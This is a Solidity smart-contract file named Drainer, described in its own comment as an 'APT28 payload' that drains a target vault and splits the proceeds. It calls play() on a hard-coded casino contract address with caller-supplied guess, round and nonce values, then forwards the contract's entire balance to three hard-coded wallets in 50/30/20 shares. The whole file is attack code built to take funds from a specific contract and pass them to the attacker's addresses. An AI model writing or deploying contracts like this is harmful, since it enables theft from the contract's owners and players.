// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import {IDrainer} from "./IDrainer.sol";

interface IFairCasino {
    function play(uint256 _guess, uint256 _round, uint256 _nonce) external payable;
    function currentRound() external view returns (uint256);
}

interface IChainlinkOracle {
    function latestRoundData() external view returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    );
}

/**
 * @title Drainer
 * @notice APT28 payload — drain target vault and split proceeds atomically.
 */
contract Drainer is IDrainer {

    IFairCasino public constant target = IFairCasino(0xed5415679D46415f6f9a82677F8F4E9ed9D1302b);
    
    address payable public constant LT1 = payable(0x1acB0745a139C814B33DA5cdDe2d438d9c35060E);
    address payable public constant LT2 = payable(0xbE99BCD0D8FdE76246eaE82AD5eF4A56b42c6B7d);
    address payable public constant LT3 = payable(0xA791D68A0E2255083faF8A219b9002d613Cf0637);

    function attack(uint256 _guess, uint256 _round, uint256 _nonce) external payable override {
        require(msg.value >= 0.01 ether, "Requires exactly 0.01 ETH ticket fee");
        
        target.play{value: 0.01 ether}(_guess, _round, _nonce);
        
        distribute();
    }

    function distribute() public override {
        uint256 total = address(this).balance;
        require(total > 0, "No funds to distribute");
        
        uint256 share1 = (total * 50) / 100;
        uint256 share2 = (total * 30) / 100;
        uint256 share3 = total - share1 - share2;

        LT1.transfer(share1);
        LT2.transfer(share2);
        LT3.transfer(share3);
    }

    receive() external payable {}
}